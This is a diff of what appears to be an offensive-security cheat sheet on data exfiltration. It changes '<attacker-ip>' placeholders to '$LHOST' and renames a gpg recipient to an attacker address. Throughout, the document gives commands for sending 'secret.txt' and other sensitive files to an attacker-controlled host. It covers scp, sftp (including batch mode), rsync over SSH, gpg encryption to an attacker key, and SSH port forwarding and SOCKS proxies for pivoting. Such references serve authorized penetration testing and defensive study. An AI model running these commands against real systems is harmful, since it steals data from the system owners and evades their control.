@@ -9,12 +9,12 @@
 
 ```bash
 # Linux to Linux
-scp secret.txt <user>@<attacker-ip>:/tmp/
+scp secret.txt <user>@$LHOST:/tmp/
 ```
 
 ```powershell
 # Windows to Linux
-scp C:\Users\Public\secret.txt <user>@<attacker-ip>:/home/<user>/
+scp C:\Users\Public\secret.txt <user>@$LHOST:/home/<user>/
 ```
 
 ---
@@ -24,7 +24,7 @@ scp C:\Users\Public\secret.txt <user>@<attacker-ip>:/home/<user>/
 ### Interactive
 
 ```bash
-sftp <user>@<attacker-ip>
+sftp <user>@$LHOST
 put secret.txt
 exit
 ```
@@ -33,7 +33,7 @@ exit
 
 ```bash
 echo "put secret.txt" > sftp_commands.txt
-sftp -b sftp_commands.txt <user>@<attacker-ip>
+sftp -b sftp_commands.txt <user>@$LHOST
 ```
 
 ---
@@ -54,7 +54,7 @@ openssl enc -aes-256-cbc -d -in secret.enc -out secret.txt -k SuperSecretKey
 
 ```bash
 # Encrypt
-gpg --output secret.gpg --encrypt --recipient attacker@example.com secret.txt
+gpg --output secret.gpg --encrypt --recipient attacker@operator.example secret.txt
 
 # Decrypt after transfer
 gpg --output secret.txt --decrypt secret.gpg
@@ -65,7 +65,7 @@ gpg --output secret.txt --decrypt secret.gpg
 ## rsync over SSH
 
 ```bash
-rsync -avz -e ssh /path/to/data <user>@<attacker-ip>:/tmp/
+rsync -avz -e ssh /path/to/data <user>@$LHOST:/tmp/
 ```
 
 ---
@@ -75,14 +75,14 @@ rsync -avz -e ssh /path/to/data <user>@<attacker-ip>:/tmp/
 ### Local Port Forward for File Transfer
 
 ```bash
-ssh -L 9001:10.10.10.10:22 <user>@<attacker-ip>
+ssh -L 9001:$IP:22 <user>@$LHOST
 scp -P 9001 <user>@localhost:/sensitive/data.txt /safe/location/
 ```
 
 ### SOCKS5 Proxy
 
 ```bash
-ssh -D 1080 <user>@<attacker-ip>
+ssh -D 1080 <user>@$LHOST
 ```
 
 Configure `curl` or `wget` to use `socks5://127.0.0.1:1080`.
